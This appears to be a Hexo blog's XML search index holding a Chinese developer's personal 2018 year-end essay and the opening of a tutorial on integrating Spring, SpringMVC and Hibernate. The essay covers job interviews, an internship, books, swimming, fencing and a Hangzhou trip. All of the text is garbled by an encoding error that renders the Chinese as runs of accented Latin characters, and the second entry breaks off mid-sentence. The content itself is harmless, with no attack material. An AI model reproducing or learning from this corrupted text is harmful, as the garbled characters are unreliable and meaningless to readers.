ç¼“å­˜å‡»ç©¿ã€ç©¿é€ã€é›ªå´©è¦æ€Žä¹ˆè§£å†³ï¼Ÿï¼Œæˆ‘è¢«æ¥è‡ªä¸€çº¿çš„å·¥ç¨‹å¸ˆéš¾ä½äº†ï¼Œè¿™äº›é—®é¢˜å¯¹äºŽå³å°†æ¯•ä¸šçš„æˆ‘æ¥è¯´æ ¹æœ¬æ²¡é‡åˆ°è¿‡ï¼Œå¯¹äºŽæŠ€æœ¯å²—ä¸´æ—¶æŠ±ä½›è„šæ˜¯æ²¡ç”¨çš„ã€‚ åŒæ—¶æˆ‘ä¹Ÿè®¤è¯†åˆ°äº†æŠ€æœ¯ä¹‹æ·±ï¼Œæ·±ä¸è§åº•ï¼Œä»ŠåŽä¸€å®šè¦ä»Žä¸€è€Œç»ˆï¼Œè®¤çœŸé’»ç ”ã€‚ ä¼˜è¾©å’Œæˆ‘å¤±ä¹‹äº¤è‡‚ï¼Œé˜¿é‡Œä¹Ÿæ²¡æœ‰é¢è¯•æˆåŠŸï¼Œæˆ‘æ·±åˆ»çš„æ„è¯†åˆ°äº†è‡ªå·±çš„é—®é¢˜ï¼Œåšäº‹æƒ…ä¸€å®šè¦å…¨é¢è€Œä¸“æ³¨ï¼Œä»Žä¸‹å†³å¿ƒçš„çš„é‚£ä¸€åˆ»èµ·å°±åº”è¯¥ä»Žä¸€è€Œç»ˆï¼Œç›´åˆ°è¾¾æˆç›®æ ‡ã€‚ æ„Ÿæ©é€šè¿‡ä¸€æ¬¡æ¬¡çš„é¢è¯•ï¼Œè®©æˆ‘å‘çŽ°äº†è‡ªå·±çš„ä¸è¶³ï¼Œå¹¶ä¸”åšäº†å¾ˆå¤šè¯¾åŽå·¥ä½œï¼Œå·å·çš„è¡¥ä¸Šã€‚æœ€ç»ˆæœ‰å¹¸æŠ•é€’åˆ°äº†æˆ‘çŽ°åœ¨çš„å…¬å¸ï¼Œé¢è¯•å®˜é—®äº†æˆ‘å‡ ä¸ªæ¯”è¾ƒç®€å•çš„é—®é¢˜ï¼Œé—®çš„åŸºæœ¬æ˜¯æ­£å¸¸åº”å±Šç”Ÿåº”è¯¥éƒ½æŽŒæ¡çš„çŸ¥è¯†ï¼Œèµ·å…ˆè®©æˆ‘å£è¿°æŽ’åºç®—æ³•ï¼Œå½“ä»–å¬å®Œæˆ‘çš„å£è¿°åŽæ€ç´¢äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯ä¸å¤ªä¿¡å§ï¼ŒäºŽæ˜¯è®©æˆ‘åœ¨çº¸ä¸Šå†™å‡ºæ¥ã€‚ç”±äºŽæœ‰ç‚¹ç´§å¼ ï¼Œç»™ä»–çš„é‚£ä¸€åˆ»æˆ‘å¥½åƒå¯Ÿè§‰åˆ°å†™é”™äº†ï¼Œç»“æžœæˆ‘å‘çŽ°é¢è¯•å®˜å¾®å¾®çš„æ‘‡å¤´åŽå°±ç¡®å®šæˆ‘çœŸçš„å†™é”™äº†ï¼Œä½†æ˜¯é¢è¯•å®˜æ²¡æœ‰æ‹†ç©¿æˆ‘ã€‚æˆ‘çŠ¯äº†ä¸€ä¸ªéžå¸¸ä½Žçº§çš„é”™è¯¯ï¼Œä½†æ˜¯ä¾æ—§æ²¡æœ‰ä¸ºéš¾æˆ‘ã€‚æˆ‘å¾ˆæ•¬ä½©ä»–çš„ä¸¥è°¨è®¤çœŸä»¥åŠå’Œè”¼å¯äº²ï¼Œæˆ‘å¾ˆè£å¹¸ðŸ˜Š 2. å…³äºŽå·¥ä½œå­¦ä¹ å…³äºŽå·¥ä½œåˆšåˆ°å…¬å¸å®žä¹ çš„æ—¶å€™ï¼Œæˆ‘å±žäºŽèŒæ–°ï¼Œé¢†å¯¼ç»™æˆ‘åˆ†é…äº†ä¸€ä¸ªç»„é•¿å¸¦æˆ‘ï¼Œå½“æ—¶å¯èƒ½æ—¶é—´ç´§ä»»åŠ¡é‡ï¼Œå®žä¹ å…¥èŒç¬¬ä¸€å¤©ç»„é•¿å°±è®©æˆ‘ç”¨Ktå†™ä¸€ä¸ªæŽ¥å£ã€‚æˆ‘çœ‹åˆ°é¡¹ç›®è¿˜æ˜¯ç”¨Boot+Gradleæž„å»ºçš„ï¼Œå¿ä¸ä½æœ‰ç‚¹å°æ¿€åŠ¨ï¼Œå†…å¿ƒçš„å°è¯æ˜¯ï¼Œè¿™ä¹Ÿå¤ªæžå®¢äº†å§ã€‚é™¤äº†Androidå’Œè‡ªå·±çš„é¡¹ç›®æ˜¯ç”¨Gradleä»¥å¤–ï¼Œä¹‹å‰å·¥ä½œå®¤çš„é¡¹ç›®éƒ½æ˜¯ç”¨Mavenæž„å»ºï¼Œæ‰€ä»¥æ„Ÿè§‰çœŸçš„æ˜¯æ¥å¯¹éƒ¨é—¨äº†ã€‚å…¥èŒåŽç›´æŽ¥ä¸Šæ‰‹å†™æŸä¸ªå­ä¸šåŠ¡çš„ä»£ç ï¼Œå¾ˆå¤šå¤§ä¸šåŠ¡æˆ‘éƒ½è¿˜æ²¡æžæ¸…æ¥šï¼Œä¹Ÿæ²¡æœ‰äººè·Ÿæˆ‘è¯´ï¼Œæ‰€ä»¥å¾ˆå¤šä¸šåŠ¡ç›¸å…³çš„æˆ‘éƒ½ä¸€è„¸æ‡µé€¼ï¼Œä¹‹å‰åœ¨å­¦æ ¡æ„Ÿè§‰å¾ˆç®€å•çš„å¾®ä¿¡å¼€å‘ï¼Œå…¥èŒåŽå‘çŽ°ç»“åˆä¸šåŠ¡åŽå˜å¾—ä¸å†ç®€å•ã€‚å› ä¸ºå½“æ—¶ä¸äº†è§£ä¸šåŠ¡åœºæ™¯ä»¥åŠä¼ä¸šå„ä¸ªç³»ç»Ÿä¹‹é—´çš„å…³ç³»ï¼Œæ‰€ä»¥çœ‹åˆ°çš„éƒ½æ˜¯å„ç§ç³»ç»Ÿçš„ç›¸äº’è°ƒç”¨ï¼Œæ²¡äººå’Œæˆ‘æ•´ä½“è®²äº§å“å†…å®¹å’Œç»„ç»‡æž¶æž„ï¼Œæ‰€ä»¥ä¸€è„¸æ‡µï¼Œå¾ˆæœ‰æŒ«è´¥æ„Ÿã€‚å¯¼è‡´æˆ‘åœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ²¡æ³•æŽŒæ¡æ•´ä¸ªå…¬å¸çš„ä¸šåŠ¡ï¼Œæˆ‘æ‰€ç†è§£çš„ä¸šåŠ¡å¾ˆæœ‰é™ï¼Œåœ¨æŸä¸€å—ä¸šåŠ¡æ²¡æ³•ä¸€è§ˆå…¨å±€ï¼Œåäº•è§‚å¤©çš„æ—¢è§†æ„Ÿéžå¸¸å¼ºã€‚çŽ°åœ¨æˆ‘å·²ç»æ…¢æ…¢çš„ä»Žä¸€ä¸ªå°åŠŸèƒ½æ‰©å±•åˆ°å…¶ä»–æ¨¡å—ï¼Œè·Ÿç€ç»„é•¿ä¸€èµ·åšäº†å‡ ä¸ªä¸šåŠ¡ç³»ç»Ÿï¼Œç»ˆäºŽå¯¹å¤§çš„æ¡æ¡æ¡†æ¡†å’Œè¿™äº›ä¸šåŠ¡æœ‰äº†æ›´å¤šçš„äº†è§£ã€‚æœŸé—´æœ‰æ®µæ—¶é—´æˆ‘æ²‰æµ¸åˆ°äº†ä¸€ä¸ªå‰ç«¯æ°´å¾ˆæ·±çš„ä¸šåŠ¡ä¸­ï¼Œæ¯å¤©è¢«å„ç§ç¹çä¸”è€—æ—¶çš„ä»»åŠ¡ç¼ ç€ï¼Œé¢†å¯¼å¯èƒ½ä»¥ä¸ºæˆ‘æ²¡å•¥äº‹å¹²å§ï¼Œå…¶å®žè¿˜æŒºå¤šäº‹çš„ã€‚å¾ˆå¤šæ ¸å¿ƒçš„åŠŸèƒ½ç»„é•¿å†™äº†ï¼Œå‰©ä¸‹ä¸€äº›éžæ ¸å¿ƒä½†æ˜¯å´éžå¸¸ç¹ççš„åœ°æ–¹æˆ‘ä¹Ÿå†™äº†ä¸å°‘ã€‚å¸Œæœ›æ–°çš„ä¸€å¹´æˆ‘èƒ½å¤Ÿæœ‰æ‰€çªç ´ï¼Œèƒ½å¤Ÿæœ‰æ‰€æ‹…å½“ã€‚ å…³äºŽå­¦ä¹ å·¥ä½œåŽæ„Ÿè§‰è‡ªä¸»å­¦ä¹ çš„æ—¶é—´è¶Šæ¥è¶Šå°‘äº†ï¼Œè™½ç„¶è¯´å·¥ä½œæœ¬èº«ä¹Ÿæ˜¯åœ¨å­¦ä¹ ï¼Œä½†æ˜¯å’Œè‡ªå·±å­¦ä¹ æœ‰å¾ˆå¤§çš„ä¸ä¸€æ ·.ä»Žå·¥ä½œä¸­ä¹Ÿæ”¶èŽ·åˆ°äº†å¾ˆå¤šï¼Œæ¯”å¦‚ä¹‹å‰ä¸æ‡‚æ—¥å¿—è¾“å‡ºçš„é‡è¦æ€§ï¼Œä¸æ‡‚å¦‚ä½•å®šä½çº¿ä¸Šé—®é¢˜ï¼Œå¯¹Linuxç³»ç»Ÿä¸ç†Ÿç»ƒç­‰ï¼Œä»¥åŠå¯¹ä¸€äº›ç³»ç»Ÿæ¡†æž¶çš„è®¾è®¡ç­‰ï¼Œéƒ½æ˜¯åœ¨å·¥ä½œä¹‹åŽæ‰æœ‰äº†æ›´åŠ æ·±åˆ»çš„ä½“ä¼šï¼Œå­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚ä¹Ÿå¾ˆæ„Ÿè°¢æˆ‘çš„ç»„é•¿èƒ½å¤Ÿå¸¦æˆ‘ã€‚å¯èƒ½æˆ‘çš„æ€§æ ¼å±žäºŽé—·éªšåž‹ï¼Œåœ¨å¾ˆå¤šæ—¶å€™éƒ½ä¸å¤Ÿä¸»åŠ¨ï¼Œæˆ‘è§‰å¾—æˆ‘åº”è¯¥ä¸»åŠ¨åŽ»è¯·æ•™é—®é¢˜ï¼Œè€Œä¸æ˜¯ç­‰é—®é¢˜æ‰¾ä¸Šæˆ‘ã€‚æ²¡æœ‰é—®é¢˜æ‰¾ä¸Šä½ ï¼Œè¯´æ˜Žä½ ç¦»æ·˜æ±°ä¹Ÿä¸è¿œäº†ã€‚æˆ‘ä¸å¸Œæœ›åšä¸€ä¸ªå®‰äºŽçŽ°çŠ¶çš„äººï¼Œæˆ‘å¾ˆæ€•å˜æˆè¿™æ ·ä¸€ä¸ªäººã€‚å¸Œæœ›æ–°çš„ä¸€å¹´ï¼Œæ–°çš„å¼€å§‹ï¼Œæˆ‘èƒ½å¤Ÿæœ‰æ‰€æ”¹å˜ï¼Œæˆä¸ºä¸€ä¸ªç§¯æžä¸»åŠ¨çš„äººã€‚ 3. å…³äºŽä¸šä½™æ—¶é—´ä¸šä½™æ—¶é—´ï¼šå­¦ä¹ ï¼Œå†™åšå®¢ï¼Œæ¸¸æ³³ï¼Œå¥èº«ã€å‡»å‰‘ã€‚ å…³äºŽå­¦ä¹ ä»Žå®žä¹ å¼€å§‹ä»Žå¤–é¢ç§Ÿæˆ¿ï¼Œé™†é™†ç»­ç»­ä¹°äº†å¾ˆå¤šä¹¦ï¼šã€ŠJavaæ ¸å¿ƒæŠ€æœ¯ã€‹å·ä¸€å·äºŒéƒ½ä¹°äº†ï¼Œè™½ç„¶Javaå¹³æ—¶å¸¸è§çš„ç¼–ç¨‹åœºæ™¯ç¼–ç åŸºæœ¬å¤Ÿç”¨ï¼Œä½†æ˜¯å­¦æ— æ­¢å¢ƒï¼ŒåŸºç¡€çŸ¥è¯†æˆ‘è§‰å¾—å¾ˆæœ‰å¿…è¦åå¤å’€åš¼ã€‚ç‰¹åˆ«æ˜¯JDKæºç ï¼Œä¸€ç›´æƒ³ç³»ç»Ÿæ€§çš„å­¦ä¹ å´ä¸€ç›´æ²¡æœ‰æŠ½å‡ºæ—¶é—´å­¦ã€‚å¦å¤–è¿˜ä¹°äº†ä¸€äº›åˆ°ç›®å‰ä¸ºæ­¢ä»Žæ¥éƒ½æ²¡æœ‰ç¿»è¿‡å‡ æ¬¡çš„ä¹¦ã€ŠJVMé«˜çº§ç‰¹æ€§ä¸Žæœ€ä½³å®žè·µã€‹ç¬¬äºŒç‰ˆã€ã€Šå®žæˆ˜Gradleã€‹ã€ã€ŠSpring æºç æ·±åº¦è§£æžã€‹ã€‚è¿˜æœ‰ä¸€äº›ä¹¦æ˜¯ä¸€æ—¶å†²åŠ¨ä¹°çš„ï¼Œæ¯”å¦‚ã€ŠLinuxé¸Ÿå“¥çš„ç§æˆ¿èœã€‹ã€ã€ŠJavaé«˜å¹¶å‘ç¨‹åºè®¾è®¡ã€‹ã€ã€Šæ•°æ®ç»“æž„ä¸Žç®—æ³•åˆ†æžã€‹Javaè¯­è¨€æè¿°ã€ã€Šå‰‘æŒ‡Offerã€‹ç­‰ä¹¦ï¼Œè¿™äº›ä¹¦ä¸­ç¿»çœ‹æ¯”è¾ƒå¤šçš„æ˜¯ã€ŠJavaé«˜å¹¶å‘ç¨‹åºè®¾è®¡ã€‹ã€‚è¿˜æœ‰ç½‘ç»œç›¸å…³çš„ä¹¦å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œä¹°çš„ä¹¦å †èµ·æ¥çš„é«˜åº¦å·²ç»å’Œä¹¦æ¡Œç›¸å½“äº†ã€‚ä¹°è¿™ä¹ˆå¤šä¹¦å…¶å®žæ˜¯è§‰å¾—åŸºç¡€å¾ˆé‡è¦ï¼Œè¦ååå¤å¤çš„é›•ç¢æ‰èƒ½æœ‰æ‰€æé«˜ã€‚æˆ‘å¸Œæœ›æ–°çš„ä¸€å¹´æˆ‘å¯ä»¥è§„åˆ’å¥½è‡ªå·±çš„å­¦ä¹ æ—¶é—´ï¼Œèƒ½å¤Ÿç³»ç»Ÿæ€§çš„å­¦ä¹ ã€‚çŽ°åœ¨æˆ‘æ¯å¤©è¿˜åœ¨è¯»è‹±è¯­ï¼Œæˆ‘å¸Œæœ›æœªæ¥çš„æŸä¸€å¤©ï¼Œæˆ‘èƒ½å¤Ÿæœ‰æœºä¼šå‡ºå›½ç•™å­¦ï¼Œæˆä¸ºä¸€ä¸ªæ›´å¥½çš„è‡ªå·±ã€‚ å†™åšå®¢åšå®¢åŽŸæœ¬æ‰“ç®—ä¸€å‘¨ä¸€æ›´æ–°ï¼Œä½†æ˜¯å·¥ä½œåŽä¸åƒåœ¨å­¦æ ¡ã€‚ä¹‹å‰åœ¨å­¦æ ¡çš„æ—¶å€™ç”šè‡³å¯ä»¥å‡ å¤©ä¸€æ›´æ–°ï¼Œå› ä¸ºæœ‰å¤ªå¤šçš„åŸºç¡€çŸ¥è¯†éœ€è¦å­¦ä¹ ï¼Œæ¯å¤©éƒ½æœ‰ç¬”è®°å¯ä»¥æ€»ç»“ï¼Œå¦ä¸€æ–¹é¢æ˜¯æœ‰å¾ˆå¤šæ—¶é—´ã€‚è™½ç„¶å¤§å­¦å†™çš„åšå®¢å› ä¸ºWordPresså¯¼å‡ºçš„æ•°æ®åº“å¤‡ä»½ä¸¢å¤±äº†ï¼Œå¯¼è‡´è¿ç§»å‡ æ¬¡çš„åšå®¢å…¨éƒ½æ²¡äº†ã€‚çŽ°åœ¨çš„åšå®¢å…¶å®žæ˜¯å·¥ä½œä¹‹åŽç”¨Hexoé‡æ–°æ­å»ºçš„ï¼Œå·¥ä½œä¸­ç»å¸¸ä¼šé‡åˆ°ä¸€äº›æ¯”è¾ƒçŽ„å­¦çš„é—®é¢˜ï¼Œæœ€ç»ˆæ‰¾åˆ°é—®é¢˜å¹¶ä¸”è§£å†³åŽæˆ‘éƒ½ä¼šè®°å½•åœ¨åšå®¢ä¸­ã€‚æœ¬æ¥è®¡åˆ’ç³»ç»Ÿæ€§çš„å†™JVMç›¸å…³çš„ï¼Œä»¥åŠä¸€äº›éžå¸¸åŸºç¡€æ€§çš„çŸ¥è¯†æ€»ç»“ï¼Œä½†æ˜¯å› ä¸ºå„ç§åŽŸå› è¿Ÿè¿Ÿæ²¡æœ‰å†™ã€‚æˆ‘å¸Œæœ›æ–°çš„ä¸€å¹´ï¼Œæˆ‘èƒ½å¤Ÿç»å¸¸å†™å†™åšå®¢ï¼Œèƒ½å¤Ÿé™ä¸‹å¿ƒæ¥è®¤çœŸé’»ç ”æ¯ä¸ªåŸºç¡€çŸ¥è¯†ã€‚ å…³äºŽæ¸¸æ³³å…³äºŽæ¸¸æ³³ï¼Œæ˜¯å¤§å­¦èˆå‹æŽ¨èçš„ä¸€å®¶å¥èº«æˆ¿ï¼Œåœ¨ä¸‡è¾¾å¥ä½“æ— æžï¼Œé™¤äº†æ¸¸æ³³è¿˜æœ‰å…¶ä»–å¥èº«é¡¹ç›®ï¼Œæˆ‘åŠžäº†ä¸€å¼ æ¸¸æ³³åŠ å¥èº«çš„å¹´å¡ã€‚åˆ°ç›®å‰åŸºæœ¬è¿žç»­æ¸¸äº†ä¸€ä¸ªæœˆå·¦å³ï¼Œä»Žæœ€åˆçš„æ—±é¸­å­ï¼ŒçŽ°åœ¨å·²ç»å­¦ä¼šè›™æ³³äº†ï¼Œå°±åœ¨æ˜¨æ™šè¿˜æ¸¸äº†ä¸€æ¬¡ï¼Œæ¸¸æ³³å®ŒåŽåœ¨66åº¦çš„æ±—è’¸æˆ¿è’¸ä¸€ä¸‹ï¼Œçˆ½çˆ†ã€‚ å…³äºŽå¥èº«è™½ç„¶çŽ°åœ¨åœ¨è·‘æ­¥æœºä¸Šäº”å…¬é‡Œå¯ä»¥è·‘è¿›22åˆ†é’Ÿ34ç§’ï¼Œè¶…è¿‡äº†ä¸€ç‚¹ç‚¹ç›®å‰å…µå“¥å“¥åŠæ ¼çº¿æ ‡å‡†ï¼Œä½†æ˜¯æˆ‘çš„èº«ä½“è¿˜æ˜¯æŒºå¼±çš„ã€‚ä¹‹æ‰€ä»¥è¿™ä¹ˆè¯´ï¼Œæ˜¯å› ä¸ºä»Žå°åˆ°å¤§æˆ‘çš„ä½“è´¨éƒ½æ˜¯åå¼±çš„ï¼Œè™½ç„¶æ²¡æœ‰ç–¾ç—…ï¼Œä½†æ˜¯å—ä¸äº†é«˜å¼ºåº¦è®­ç»ƒã€‚è™½ç„¶é«˜ä¸­æœ‰å‚åŠ ä½“è‚²é˜Ÿï¼Œè¿›è¡Œè¿‡é«˜å¼ºåº¦è®­ç»ƒï¼Œä¹Ÿè®¸é‚£æ—¶å€™è¿˜æ¯”è¾ƒå¹´è½»ï¼ŒåŠ ä¸Šå½“æ—¶ç–¯ç‹‚è¿·æ‹æŽå°é¾™ï¼Œä¿¡ä»°åŠ æŒçš„æˆ‘å¯ä»¥è·³è·ƒçš„å¾ˆé«˜ï¼Œæ•´ä¸ªäººå¾ˆè½»çš„æ„Ÿè§‰ã€‚è‡ªä»Žä¸Šäº†å¤§å­¦ä¹‹åŽï¼Œæ¯å¤©ç¼–ç¨‹ç†¬å¤œçš„æ— æ‰€é¡¾å¿Œï¼ŒåŠ ä¸Šåƒæ±‰å ¡ç­‰åžƒåœ¾é£Ÿå“ï¼Œå¯¼è‡´ä½“åž‹å˜èƒ–ï¼Œèº«ä½“å¼€å§‹æœ‰ç‚¹å‘è™šäº†ã€‚ å…³äºŽå‡»å‰‘å¥ä½“æ— æžé™¤äº†æ¸¸æ³³å¥èº«è¿˜æœ‰å¾ˆå¤šå…¶ä»–è¯¾ç¨‹ï¼Œæˆ‘æŠ¥äº†å‡»å‰‘è¯¾ç¨‹ï¼ˆæ•™ç»ƒæ˜¯æˆ‘æœ¬å®¶ï¼Œæ¯”æˆ‘å°ä¸€å²ï¼Œä½†æ˜¯æ¯”æˆ‘é«˜ä¸€æˆªï¼Œæ˜¯ä¸ªç¾Žå¥³æ•™ç»ƒï¼‰ï¼Œåœ¨ç¬¬ä¸€æ¬¡çƒ­èº«çš„æ—¶å€™æˆ‘å°±å¼€å§‹å‡ºçŽ°çœ©æ™•çš„ç—‡çŠ¶ã€‚åº”è¯¥æ˜¯è·³è·ƒæ€§çš„åŠ¨ä½œæˆ‘çš„å‘¼å¸ä¸åè°ƒé€ æˆçš„ç¼ºæ°§ã€‚åœ¨åŽç»­çš„å‡»å‰‘è¯¾é‡Œï¼Œæ•™ç»ƒæœ‰é’ˆå¯¹æ€§çš„å¯¹æˆ‘è¿›è¡Œçƒ­èº«ï¼Œæ²¡æœ‰å‡ºçŽ°ç¬¬ä¸€æ¬¡é‚£æ ·çš„ä¸é€‚æ„Ÿï¼Œå¯èƒ½çœŸçš„èº«ä½“æ¯”è¾ƒè™šï¼Œå¸Œæœ›æ–°çš„ä¸€å¹´æˆ‘èƒ½å¤ŸåšæŒé”»ç‚¼å¹¶ä¸”ç˜¦ä¸‹æ¥ï¼Œé¢†æ‚Ÿå‡»å‰‘ç²¾ç¥žï¼Œæˆä¸ºä¸€ä¸ªæ›´å¥½çš„è‡ªå·±ã€‚ 4. å…³äºŽæ—…è¡ŒåŽ»äº†å—é–åœŸæ¥¼ã€åŽ»äº†æ­å·žã€é¡ºé“åŽ»äº†ä¸€è¶Ÿèš‚èšé‡‘æœè¿˜æ„¿ï¼ˆæ‰¾è™ï¼‰ å—é–åœŸæ¥¼å’Œå¤§å­¦å·¥ä½œå®¤çš„ä¸€ç¾¤å°ä¼™ä¼´ç›¸çº¦åŽ»å—é–ï¼Œé‚£å¤©å¤©å¾ˆè“ï¼Œé£Žæ™¯å¾ˆç¾Žï¼Œå¿ƒæƒ…ä¹Ÿè·Ÿç€å¦‚è¯—å¦‚ç”»ï¼Œå¾ˆéš¾å¿˜çš„ä¸€æ¬¡å›žå¿†ã€‚ æ­å·žä¹‹æ—…æ¯•ä¸šåŽè¿˜åŽ»äº†ä¸€æ¬¡æ­å·žï¼Œæ¥äº†ä¸ªæ¯•ä¸šæ—…è¡Œã€‚é¡ºé“åŽ»äº†èš‚èšé‡‘æœå…¨çƒè®­ç»ƒè¥ï¼Œä»Žè¿›ç”µæ¢¯å¼€å§‹å…¨ç¨‹è‹±è¯­ï¼Œå¾ˆè£å¹¸æœ‰æœºä¼šèƒ½å’Œæ¥è‡ªå…¨çƒçš„åŒå­¦ååœ¨åŒä¸€é—´æ•™å®¤é‡Œã€‚çŽ°åœºæœ‰æ¥è‡ªå°æ¹¾çš„ç•™å­¦ç”Ÿï¼Œä¹Ÿæœ‰æ¥è‡ªç¾Žå›½çš„ç ”ç©¶ç”Ÿï¼Œä»Žç­¾åˆ°è¡¨ä¸Šçœ‹åˆ°40å¤šä¸ªäººé‡Œé¢åªæœ‰å¯¥å¯¥æ— å‡ çš„å‡ ä¸ªä¸­æ–‡åï¼Œæˆ‘çš„è‹±è¯­æ°´å¹³å¾ˆå·®ï¼Œæ•´ä¸ªä¸‹åˆå¬å¾—ä¸€è„¸æ‡µï¼Œç«™åœ¨å³ä¾§çš„é˜¿é‡Œå›¢é˜Ÿè™Žè§†çœˆçœˆçš„ç”¨è‹±æ–‡å’Œæˆ‘ä»¬äº¤æµç€ï¼Œæˆ‘å½“æ—¶çš„æƒ³æ³•åªæœ‰ä¸€ä¸ªï¼Œæˆ‘ä¸€å®šè¦æŠŠè‹±è¯­å­¦å¥½ã€‚ä»Žèš‚èšZç©ºé—´å‡ºæ¥åŽï¼Œå’Œç•™å­¦ç”Ÿäº’ç›¸ç•™äº†è”ç³»æ–¹å¼ï¼Œååœ¨ä¸€èµ·å•ç‹¬èŠäº†èŠå„è‡ªçš„å‘å±•å’Œè§„åˆ’ã€‚æ­å·žä¹‹è¡Œä¸ä»…ä»…æ˜¯çœ‹äº†é£Žæ™¯ç§€ä¸½çš„è¥¿æ¹–ï¼Œæ›´å¤šçš„æ”¶èŽ·æ˜¯æ¥è‡ªå†…å¿ƒçš„è®¤çŸ¥ï¼Œæ„Ÿå—åˆ°äº†ä»€ä¹ˆå«åšçœŸæ­£çš„ä¸èƒ½è¢«å¿½è§†çš„ä¼˜ç§€ã€‚ 21å¤©æ³•åˆ™åŠ å¥–åŠ±æœºåˆ¶è®©æˆ‘å…»æˆäº†æ¯å¤©æ—©ä¸ŠèƒŒå•è¯çš„ä¹ æƒ¯ï¼Œåˆ°ä»Šå¤©ä¸ºæ­¢å·²ç»è¿žç»­ä¸é—´æ–­çš„åšæŒäº†208å¤©ã€‚æˆ‘å¸Œæœ›æ–°çš„ä¸€å¹´èƒ½å¤ŸæŒä¹‹ä»¥æ’ï¼Œå†æŽ¥å†åŽ‰ã€‚å¯¹äºŽä¸å¥½çš„ç”Ÿæ´»ä¹ æƒ¯ï¼Œæˆ‘å¸Œæœ›èƒ½å¤Ÿåƒå¥–åŠ±æœºåˆ¶ä¸€æ ·æ‰¾åˆ°ä¸€ç§èƒ½å¤Ÿä¸€æ¬¡æ€§è§£å†³çš„æƒ©ç½šæœºåˆ¶æ¥å…‹åˆ¶è‡ªå·±ã€‚ æŽ¥ä¸ªè¯é¢˜æˆ‘å·²ç»è¿žç»­å‰ƒäº†ä¸¤å¹´çš„å…‰å¤´ï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†åŽŸå› ç®—æ˜¯æˆ‘ä¸€ç§åšé”™äº‹çš„æƒ©ç½šæœºåˆ¶ï¼Œä½†æ˜¯ä¸æ˜¯åŠæ—¶å¤„ç½šï¼Œæ‰€ä»¥å‰ƒäº†å…‰å¤´ä¾æ—§é”™è¯¯ä¸æ–­ã€‚å¦‚æžœèº«ä¸Šæœ‰ä¸ªé‡ç½®çš„æŒ‰é’®ä½ ä¼šä¸ä¼šæŒ‰ï¼Ÿ æˆ‘çš„ç­”æ¡ˆæ˜¯ä¼šã€è€Œä¸”é‡å¤ä¸æ–­çš„æŒ‰ï¼Œä¸æ–­çš„æ ¼å¼åŒ–ã€‚ä¸»è§‚æ„è¯†æ˜¯ï¼šæ¸…ç©ºæ¯å­ã€é‡æ–°æ¥è¿‡ã€‚ç”µè„‘æ‰‹æœºipadå®šæœŸæ ¼å¼åŒ–ï¼Œå·²ç»å…»æˆäº†ä¸€ç§å¼ºè¿«ç—‡ æ€»ç»“ æˆ‘å¸Œæœ›ä»Ž2019å¹´1æœˆ1æ—¥èµ·ï¼Œæˆ‘ä¸å†å‰ƒå…‰å¤´ï¼Œä¸å†æ ¼å¼åŒ–ã€‚æˆ‘è¦åšæœ€å¥½çš„è‡ªå·±ï¼Œæˆ‘è¦å¼€å§‹ç•™å‘ã€‚ æˆ‘çš„é‡Žå¿ƒä¾æ—§å¾ˆå¤§ï¼šæ‰“é€šä»»ç£äºŒè„‰æˆä¸ºæŽå°é¾™ä¸€æ ·çš„ç”·äººã€æŽŒæ¡æ ¸å¿ƒç§‘æŠ€æˆä¸ºæ¯”å°”ç›–èŒ¨ä¸€æ ·çš„ç²¾è‹±ã€è¯»ä¸‡å·ä¹¦è¡Œä¸‡é‡Œè·¯ã€‚ æ–°çš„ä¸€å¹´ï¼šå¸Œæœ›è‡ªå·±ä¸€æ­¥ä¸€ä¸ªè„šå°ï¼Œå¥½å¥½é”»ç‚¼èº«ä½“ã€è®¤è®¤çœŸçœŸçš„å­¦ä¹ ã€å…¢å…¢ä¸šä¸šçš„å·¥ä½œã€‚â€”â€”â€”â€” è“å£«é’¦ 2018å¹´12æœˆ30æ—¥ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•´åˆSSHæ¡†æž¶ä¹‹åŸºç¡€æ­å»º]]></title>
    <url>%2F21f173fb%2F</url>
    <content type="text"><![CDATA[SpringBootæŠŠå„ç§æ¡†æž¶çš„æ•´åˆç”¨çº¦å®šä¿—æˆçš„æ¨¡æ¿è¿›è¡Œäº†é»˜è®¤é…ç½®ï¼Œç®€åŒ–äº†å„ç§æ¡†æž¶çš„æ•´åˆè¿‡ç¨‹ã€‚åœ¨æ–¹ä¾¿å¼€å‘çš„åŒæ—¶ä¹Ÿå±è”½äº†ä¸€äº›åŸºç¡€ç»†èŠ‚ï¼Œåœ¨å¾®æœåŠ¡å¤§è¡Œå…¶é“çš„ä»Šå¤©ï¼ŒSpring Boot å’Œ Spring Cloud è¿™äº›æ¡†æž¶åœ¨å¼€å‘æ—¶æ— ç–‘æ˜¯ç›®å‰çš„é¦–é€‰ï¼Œä½†æ˜¯å´ä¸åˆ©äºŽå­¦ä¹ å„ä¸ªæ¡†æž¶çš„åŸºç¡€ï¼Œå¯¹äºŽåŽç«¯çš„åˆå­¦è€…æ¥è¯´åº”å½“å›žè¿‡å¤´æ¥æŠŠæ¯ä¸ªæ¡†æž¶çš„åŸºç¡€é…ç½®å’Œä½¿ç”¨éƒ½ç³»ç»Ÿçš„å­¦ä¹ ä¸€éã€‚å¼ºè¿«ç—‡çš„æˆ‘å†³å®šè¦é‡æ–°å¼€å§‹ç”¨ä¼ ç»Ÿçš„Spring+SpringMVC+Hibernateè¿›è¡Œæ•´åˆï¼Œè¿™äº›æ¡†æž¶éƒ½å°½é‡é‡‡ç”¨ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬ï¼ŒåŽç»­å¯¹å…¶ä»–æ¡†æž¶çš„æ•´åˆé…ç½®ä»¥åŠå®žçŽ°è¿›è¡Œè¿­ä»£å­¦ä¹ ã€‚ åŸºæœ¬æ¦‚å¿µåœ¨JavaåŽç«¯å¼€å‘ä¸­ï¼Œä½¿ç”¨çš„å¤§å¤šæ•°æ¡†æž¶éƒ½é‡‡ç”¨SSHã€æˆ–è€…SSMï¼Œå³ä½¿é‡‡ç”¨Spring Bootè¿™æ ·çš„æ¡†æž¶ä¹Ÿä¸ä¾‹å¤–ï¼Œå› 